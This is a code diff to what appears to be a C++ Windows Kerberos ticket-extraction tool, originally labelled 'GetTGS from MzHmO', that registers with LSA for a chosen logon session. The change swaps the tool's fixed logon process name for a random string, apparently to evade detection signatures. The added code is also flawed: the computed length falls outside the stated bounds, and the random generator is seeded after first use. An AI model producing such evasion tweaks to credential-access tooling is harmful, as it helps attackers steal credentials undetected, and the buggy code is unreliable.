@@ -16,6 +16,21 @@ void ShowAwesomeBanner() {
 	SetConsoleTextAttribute(hConsole, 0x07);
 }
 
+std::string generateRandomString(int length)
+{
+	std::string randomString;
+	const std::string characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+
+	std::srand(static_cast<unsigned int>(std::time(nullptr)));
+	for (int i = 0; i < length; ++i)
+	{
+		int randomIndex = std::rand() % characters.length();
+		randomString += characters[randomIndex];
+	}
+
+	return randomString;
+}
+
 
 LSA_STRING* create_lsa_string(const char* value)
 {
@@ -100,8 +115,11 @@ int main() {
 		return 1;
 	}
 	std::wcout << L"[!] You've selected session with Logon ID: " << to_hex(LogonSession.LowPart) << '\n';
-
-	PLSA_STRING krbname = create_lsa_string("GetTGS from MzHmO");
+	int lb = 20, ub = 100;
+	std::string andrewRandomString = generateRandomString(rand() % (ub - lb + 1));
+	std::cout << "[!] Logon Process Name: " << andrewRandomString << std::endl;
+	const char* name = andrewRandomString.c_str();
+	PLSA_STRING krbname = create_lsa_string(name);
 	LSA_OPERATIONAL_MODE info;
 	HANDLE LsaHandle = NULL;
 	NTSTATUS status = LsaRegisterLogonProcess(krbname, &LsaHandle, &info);
